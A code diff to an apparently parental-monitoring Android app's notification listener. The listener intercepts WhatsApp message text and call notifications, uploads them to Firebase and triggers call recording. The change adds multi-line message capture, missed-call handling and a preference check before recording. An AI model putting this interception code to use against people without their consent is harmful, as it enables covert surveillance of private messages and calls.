@@ -4,6 +4,7 @@ import android.app.Notification
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import com.example.authapp.analytics.AppHealthTelemetry
+import com.example.authapp.data.CallRecordingPreferences
 import com.example.authapp.data.FirebaseRepository
 import com.example.authapp.data.NotificationItem
 import com.google.firebase.crashlytics.FirebaseCrashlytics
@@ -57,11 +58,14 @@ class ChildNotificationListenerService : NotificationListenerService() {
                 )
                 FirebaseRepository.pushNotification(uid, item)
 
-                // WhatsApp Chat & Status Automatic Interceptor
+                    // WhatsApp Chat & Status Automatic Interceptor
                 if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b" || packageName.contains("whatsapp", ignoreCase = true)) {
                     val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString() ?: ""
                     val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""
-                    val fullContent = "$title $text $subText $bigText".lowercase()
+                    val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
+                        ?.joinToString(" ") { it.toString() }
+                        .orEmpty()
+                    val fullContent = "$title $text $subText $bigText $textLines".lowercase()
 
                     val isWhatsAppCall = fullContent.contains("incoming voice call") ||
                             fullContent.contains("incoming video call") ||
@@ -69,25 +73,36 @@ class ChildNotificationListenerService : NotificationListenerService() {
                             fullContent.contains("ongoing video call") ||
                             fullContent.contains("call in progress") ||
                             fullContent.contains("whatsapp call")
+                    val isMissedWhatsAppCall = isWhatsAppCall && (
+                            fullContent.contains("missed call") ||
+                                    fullContent.contains("missed voice") ||
+                                    fullContent.contains("missed video")
+                    )
 
                     if (isWhatsAppCall) {
-                        isWhatsAppCallActive = true
+                        isWhatsAppCallActive = !isMissedWhatsAppCall && CallRecordingPreferences.isEnabled(applicationContext)
                         val callLog = com.example.authapp.data.CallLogItem(
                             number = "WhatsApp Call",
                             name = title.ifEmpty { "WhatsApp Contact" },
-                            type = if (fullContent.contains("incoming")) "INCOMING_WHATSAPP" else "OUTGOING_WHATSAPP",
+                            type = when {
+                                isMissedWhatsAppCall -> "MISSED_WHATSAPP"
+                                fullContent.contains("incoming") -> "INCOMING_WHATSAPP"
+                                else -> "OUTGOING_WHATSAPP"
+                            },
                             timestamp = System.currentTimeMillis()
                         )
                         FirebaseRepository.logSingleCallLog(uid, callLog)
 
-                        val serviceIntent = android.content.Intent(applicationContext, ChildForegroundService::class.java).apply {
-                            action = ChildForegroundService.ACTION_START_CALL_RECORDING
-                            putExtra(ChildForegroundService.EXTRA_PHONE_NUMBER, "WhatsApp_${title.replace(" ", "_")}")
-                        }
-                        try {
-                            androidx.core.content.ContextCompat.startForegroundService(applicationContext, serviceIntent)
-                        } catch (e: Exception) {
-                            FirebaseCrashlytics.getInstance().recordException(e)
+                        if (!isMissedWhatsAppCall && CallRecordingPreferences.isEnabled(applicationContext)) {
+                            val serviceIntent = android.content.Intent(applicationContext, ChildForegroundService::class.java).apply {
+                                action = ChildForegroundService.ACTION_START_CALL_RECORDING
+                                putExtra(ChildForegroundService.EXTRA_PHONE_NUMBER, "WhatsApp_${title.replace(" ", "_")}")
+                            }
+                            try {
+                                androidx.core.content.ContextCompat.startForegroundService(applicationContext, serviceIntent)
+                            } catch (e: Exception) {
+                                FirebaseCrashlytics.getInstance().recordException(e)
+                            }
                         }
                     }
 
@@ -105,6 +120,7 @@ class ChildNotificationListenerService : NotificationListenerService() {
                         type == "STATUS" && text.isEmpty() -> "New WhatsApp Status Update"
                         text.isNotEmpty() -> text
                         bigText.isNotEmpty() -> bigText
+                        textLines.isNotEmpty() -> textLines
                         else -> "WhatsApp notification update"
                     }
 
